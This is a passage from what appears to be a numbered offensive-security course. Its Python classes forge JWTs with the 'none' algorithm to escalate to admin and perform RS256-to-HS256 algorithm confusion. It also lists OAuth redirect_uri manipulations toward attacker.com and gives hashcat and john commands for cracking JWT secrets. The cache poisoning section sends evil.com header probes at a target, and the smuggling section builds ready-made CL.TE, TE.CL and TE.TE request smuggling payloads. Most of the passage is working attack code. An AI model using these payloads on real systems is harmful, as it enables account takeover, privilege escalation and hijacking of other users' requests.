            'payload': b64_decode(parts[1]),
            'signature': parts[2]
        }
    
    def jwt_none_algorithm(self, token: str) -> str:
        """JWT 'none' algorithm bypass"""
        decoded = self.decode_jwt(token)
        
        # Modify header to use 'none' algorithm
        header = decoded['header'].copy()
        header['alg'] = 'none'
        
        # Modify payload (e.g., escalate privileges)
        payload = decoded['payload'].copy()
        payload['role'] = 'admin'
        payload['sub'] = '1'
        
        # Encode without signature
        def b64_encode(data):
            return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')
        
        forged = f"{b64_encode(header)}.{b64_encode(payload)}."
        return forged
    
    def jwt_algorithm_confusion(self, rsa_public_key: str, payload: Dict) -> str:
        """RS256 to HS256 algorithm confusion attack"""
        # Use RSA public key as HMAC secret (alg confusion)
        header = {"alg": "HS256", "typ": "JWT"}
        
        def b64_encode(data):
            if isinstance(data, dict):
                data = json.dumps(data, separators=(',', ':'))
            return base64.urlsafe_b64encode(data.encode() if isinstance(data, str) else data).decode().rstrip('=')
        
        header_enc = b64_encode(header)
        payload_enc = b64_encode(payload)
        
        # Sign with RSA public key as HMAC secret
        message = f"{header_enc}.{payload_enc}"
        sig = hmac.new(rsa_public_key.encode(), message.encode(), hashlib.sha256).digest()
        sig_enc = base64.urlsafe_b64encode(sig).decode().rstrip('=')
        
        return f"{header_enc}.{payload_enc}.{sig_enc}"
    
    def oauth_attacks(self) -> Dict:
        """OAuth 2.0 attack techniques"""
        return {
            "csrf_via_state": {
                "description": "CSRF via missing/predictable state parameter",
                "attack": [
                    "1. Intercept authorization request",
                    "2. Remove or predict 'state' parameter",
                    "3. Craft malicious link",
                    "4. Victim clicks -> their account linked to attacker"
                ]
            },
            "redirect_uri_manipulation": [
                "Original: redirect_uri=https://app.com/callback",
                "Attack: redirect_uri=https://app.com.attacker.com/callback",
                "Attack: redirect_uri=https://app.com/callback/../../../attacker.com",
                "Attack: redirect_uri=https://app.com/callback?next=https://attacker.com",
            ],
            "authorization_code_theft": [
                "Steal code via Referer header to attacker's page",
                "Open redirect in redirect_uri",
                "Dangling markup injection",
            ],
            "token_leakage": [
                "Implicit flow: token in URL fragment (logged)",
                "Token in Referer header",
                "Insufficient token expiration",
                "Token not invalidated on logout",
            ],
            "pkce_bypass": [
                "code_challenge not verified by server",
                "code_verifier accepted without challenge",
                "Downgrade attack: S256 -> plain"
            ]
        }
    
    def jwt_crack_weak_secret(self, token: str) -> Dict:
        """Crack JWT with weak secret"""
        return {
            "hashcat": f'hashcat -a 0 -m 16500 "{token}" /usr/share/wordlists/rockyou.txt',
            "john": f'echo "{token}" > jwt.txt && john --wordlist=rockyou.txt jwt.txt',
            "tool": "jwt-cracker: jwt-cracker -t eyJ... -a abcdefghijklmnopqrstuvwxyz -l 5",
        }


if __name__ == '__main__':
    attacker = OAuthJWTAttacker()
    
    # Sample JWT (do not use real tokens)
    sample_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    decoded = attacker.decode_jwt(sample_jwt)
    print(f"[+] JWT header: {decoded['header']}")
    print(f"[+] JWT payload: {decoded['payload']}")
    
    forged = attacker.jwt_none_algorithm(sample_jwt)
    print(f"\n[+] None-algorithm forged JWT: {forged[:50]}...")
    
    oauth = attacker.oauth_attacks()
    print(f"\n[+] OAuth attack types: {list(oauth.keys())}")
    print(f"[+] Redirect URI manipulations: {len(oauth['redirect_uri_manipulation'])}")
```

## Step 739: Web Cache Poisoning

```python
#!/usr/bin/env python3
# Web cache poisoning attacks

import requests
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class CachePoisoningAttacker:
    """Web cache poisoning techniques"""
    target_url: str

    # Unkeyed headers to test for cache poisoning
    UNKEYED_HEADERS = [
        "X-Forwarded-Host",
        "X-Host",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
        "Forwarded",
        "X-Forwarded-Port",
        "X-Forwarded-For",
        "X-Cache-Key",
    ]
    
    def detect_cache_poisoning(self) -> Dict:
        """Detect potential cache poisoning vulnerabilities"""
        headers_to_test = {h: "evil.com" for h in self.UNKEYED_HEADERS}
        session = requests.Session()
        
        for header in self.UNKEYED_HEADERS:
            # Send request with malicious header
            headers = {header: "evil-test.com"}
            resp = session.get(self.target_url, headers=headers)
            
            # Check if malicious value reflected in response
            if 'evil-test.com' in resp.text:
                print(f"[!] Potential cache poisoning via {header}")
        
        return {
            "test_headers": self.UNKEYED_HEADERS,
            "detection_criteria": "Malicious header value reflected in response"
        }
    
    def host_header_poisoning(self, evil_domain: str) -> Dict:
        """Host header cache poisoning"""
        attack_headers = [
            {"Host": evil_domain},
            {"X-Forwarded-Host": evil_domain},
            {"X-Host": evil_domain},
        ]
        
        return {
            "description": "Poison cache with malicious Host header for XSS/redirect",
            "attack_scenario": [
                f"1. Send GET {self.target_url} with X-Forwarded-Host: {evil_domain}",
                "2. Application generates absolute URL using Host header",
                "3. Cached response contains malicious URL",
                "4. Other users receive cached response with evil URL",
                "5. Users click link -> redirect to attacker's site"
            ],
            "payload_headers": attack_headers
        }
    
    def cache_key_manipulation(self) -> Dict:
        """Cache key manipulation techniques"""
        return {
            "url_normalization": [
                "/page?lang=en -> /page?lang=en%20<script>alert(1)</script>",
                "/page?utm_source=test -> varies by cache (utm ignored in key?)",
            ],
            "parameter_cloaking": [
                "GET /page?evil=1&utm_content=test (utm_content in cache key, evil ignored?)",
                "Ruby on Rails: ?;parameter (parsed as separate)",
                "PHP: ?param[0]=legit&param[1]=evil",
            ],
            "header_injection": [
                "Inject newlines: X-Custom: value\r\nX-Forwarded-Host: evil.com",
            ],
            "fat_get_trick": [
                "GET /page HTTP/1.1 with body: evil=parameter",
                "Cache key based on URL only, server processes body"
            ]
        }
    
    def web_cache_deception(self) -> Dict:
        """Web cache deception attack"""
        return {
            "description": "Trick cache into storing authenticated content",
            "attack_steps": [
                "1. Find dynamic auth endpoint: /account/profile",
                "2. Craft URL: /account/profile/nonexistent.css",
                "3. Trick victim to visit crafted URL",
                "4. Cache stores authenticated response (assuming .css cached)",
                "5. Attacker fetches /account/profile/nonexistent.css",
                "6. Gets victim's authenticated response from cache"
            ],
            "extensions_to_try": [".css", ".js", ".png", ".jpg", ".ico"],
            "cache_control_check": "Look for Cache-Control: no-store (protected)"
        }


if __name__ == '__main__':
    cp = CachePoisoningAttacker("https://target.com")
    
    print(f"[+] Unkeyed headers to test: {len(cp.UNKEYED_HEADERS)}")
    for h in cp.UNKEYED_HEADERS:
        print(f"    {h}")
    
    host_poison = cp.host_header_poisoning("attacker.com")
    print(f"\n[+] Host header poisoning steps: {len(host_poison['attack_scenario'])}")
    
    deception = cp.web_cache_deception()
    print(f"\n[+] Cache deception extensions: {deception['extensions_to_try']}")
```

## Step 740: HTTP Request Smuggling

```python
#!/usr/bin/env python3
# HTTP request smuggling attacks

import socket
import ssl
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class HTTPSmuggling:
    """HTTP request smuggling attacks"""
    target_host: str
    target_port: int = 443
    use_tls: bool = True
    
    def cl_te_smuggling(self) -> str:
        """CL.TE HTTP request smuggling (frontend uses CL, backend uses TE)"""
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"  # Frontend reads 6 bytes
            "Transfer-Encoding: chunked\r\n"  # Backend uses TE
            "\r\n"
            "0\r\n"  # Chunked terminator
            "\r\n"  # End of request
            "G"  # This 'G' will be prepended to NEXT request
        )
        return payload
    
    def te_cl_smuggling(self) -> str:
        """TE.CL HTTP request smuggling (frontend uses TE, backend uses CL)"""
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"  # Backend reads only 4 bytes
            "Transfer-Encoding: chunked\r\n"  # Frontend uses TE
            "\r\n"
            "5c\r\n"  # 92 byte chunk
            "GPOST / HTTP/1.1\r\n"  # Smuggled request start
            f"Host: {self.target_host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "0\r\n\r\n"  # Backend reads these 4 chars
        )
        return payload
    
    def te_te_obfuscation(self) -> List[str]:
        """TE.TE - obfuscate Transfer-Encoding header"""
        # One frontend, one backend; obfuscate TE to confuse one of them
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",  # Space before colon
            "Transfer-Encoding: chunked, chunked",
            "Transfer-Encoding: chunked\x0b",  # Tab after
            "Transfer-Encoding\x00: chunked",  # Null byte in header name
            "X: X\nTransfer-Encoding: chunked",  # Header injection
            "Transfer-Encoding: cow\nTransfer-Encoding: chunked",
        ]
        return obfuscations
    
    def detect_smuggling(self) -> Dict:
        """Detect request smuggling vulnerabilities"""
        # CL.TE detection
        cl_te_probe = (
            "POST /search HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "1\r\n"
            "Z\r\n"
            "Q\r\n\r\n"  # Deliberately malformed to trigger timeout in TE-backend
        )
        
        return {
            "cl_te_detection": cl_te_probe,
            "tool": "smuggler.py",
            "smuggler_cmd": f"python3 smuggler.py -u https://{self.target_host}/",
            "burp_scanner": "Burp Suite Pro HTTP Request Smuggler extension",
            "h2_smuggling": "HTTP/2 downgrade smuggling (H2.CL, H2.TE)"
        }
    
    def smuggling_impact(self) -> Dict:
        """Impact of HTTP request smuggling"""
        return {
            "bypass_security_controls": [
                "Bypass front-end access controls",
                "Poison internal requests",
                "Capture other users' requests (steal credentials)",
            ],
            "cache_poisoning": [
                "Poison web cache via smuggled request",
                "Serve malicious response to other users"
            ],
            "xss_via_smuggling": [
                "Inject XSS payload into subsequent user requests"
            ],
            "real_world": [
                "CVE-2019-18277: HAProxy/HTTP/1.0 smuggling",
                "Apache/IIS smuggling vulnerabilities",
                "Mass exploitation via Cloudflare/Akamai",
            ]
        }


if __name__ == '__main__':
    smuggler = HTTPSmuggling("target.com", 443)
    
    print(f"[+] CL.TE payload:\n{smuggler.cl_te_smuggling()[:200]}...")
    
    te_obf = smuggler.te_te_obfuscation()
    print(f"\n[+] TE obfuscation techniques: {len(te_obf)}")
    for t in te_obf:
        print(f"    {repr(t)}")
    
    detect = smuggler.detect_smuggling()
    print(f"\n[+] Detection tool: {detect['smuggler_cmd']}")
    
    impact = smuggler.smuggling_impact()
    print(f"[+] Impact categories: {list(impact.keys())}")
```
